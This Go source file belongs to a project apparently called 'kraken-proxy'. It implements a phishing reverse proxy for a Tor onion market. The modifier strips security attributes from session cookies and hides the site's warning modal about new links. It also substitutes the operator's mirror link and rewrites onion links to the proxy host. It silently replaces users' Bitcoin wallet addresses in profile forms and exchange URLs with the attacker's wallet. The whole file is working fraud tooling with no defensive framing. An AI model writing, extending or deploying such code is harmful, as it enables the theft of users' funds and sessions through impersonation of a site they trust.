package modification

import (
	"io"
	"net/http"
	"net/url"
	"regexp"
	"strconv"
	"strings"

	"kraken-proxy/config"
)

type Modifier struct {
	proxyHost  string
	walletBTC  string
	mirrorLink string
}

func New(cfg *config.Config) *Modifier {
	return &Modifier{
		proxyHost:  cfg.ProxyHost,
		walletBTC:  cfg.WalletBTC,
		mirrorLink: cfg.MirrorLink,
	}
}

func (m *Modifier) Modify(resp *http.Response) error {
	for i, c := range resp.Header["Set-Cookie"] {
		c = regexp.MustCompile(`(?i)\s*domain=[^;]+\s*;?\s*`).ReplaceAllString(c, "")
		c = regexp.MustCompile(`(?i)\s*secure\s*;?\s*`).ReplaceAllString(c, "")
		c = regexp.MustCompile(`(?i)\s*samesite=[^;]+\s*;?\s*`).ReplaceAllString(c, "")
		resp.Header["Set-Cookie"][i] = c
	}

	body, _ := io.ReadAll(resp.Body)
	resp.Body.Close()
	content := string(body)

	ct := resp.Header.Get("Content-Type")
	if strings.Contains(ct, "text/html") {
		content = m.modifyHTML(content)
	}

	resp.Body = io.NopCloser(strings.NewReader(content))
	resp.ContentLength = int64(len(content))
	resp.Header.Set("Content-Length", strconv.Itoa(len(content)))
	return nil
}

func (m *Modifier) modifyHTML(content string) string {
	// 1. Удаляем modal "новые ссылки"
	content = removeModalNewLinks(content)

	// 2. Заменяем mirror link
	content = replaceMirrorLink(content, m.mirrorLink)

	// 3. Заменяем wallet в профиле
	content = replaceWallet(content, m.walletBTC)

	// 4. Заменяем wallet в exchange
	content = replaceExchangeWallet(content, m.walletBTC)

	// 5. Заменяем onion ссылки на proxy
	content = replaceOnionLinks(content, m.proxyHost)

	return content
}

func removeModalNewLinks(content string) string {
	re := regexp.MustCompile(`<div class="modal modal-signup[^>]*>.*?</div>\s*</div>\s*</div>`)
	content = re.ReplaceAllString(content, "")
	return content
}

func replaceMirrorLink(content, mirrorLink string) string {
	re := regexp.MustCompile(`<p class="copy-link__text">[^<]*\.onion[^<]*</p>`)
	replacement := `<p class="copy-link__text">` + mirrorLink + ` — все зеркала проекта</p>`
	content = re.ReplaceAllString(content, replacement)
	return content
}

func replaceWallet(content, wallet string) string {
	re := regexp.MustCompile(`(<input[^>]*name="wallet"[^>]*value=")([^"]*)(")`)
	content = re.ReplaceAllString(content, `${1}`+wallet+`${3}`)
	return content
}

func replaceExchangeWallet(content, wallet string) string {
	re := regexp.MustCompile(`(/exchange/\?[^"]*wallet=)([a-zA-Z0-9]+)`)
	content = re.ReplaceAllString(content, `${1}`+wallet)
	return content
}

func replaceOnionLinks(content, proxyHost string) string {
	re := regexp.MustCompile(`(https?)://([a-z2-7]{16,56}\.onion)(:\d+)?`)
	content = re.ReplaceAllStringFunc(content, func(match string) string {
		u, _ := url.Parse(match)
		u.Scheme = "http"
		u.Host = proxyHost
		return u.String()
	})

	re2 := regexp.MustCompile(`//[a-z2-7]{16,56}\.onion`)
	content = re2.ReplaceAllString(content, "//"+proxyHost)

	return content
}
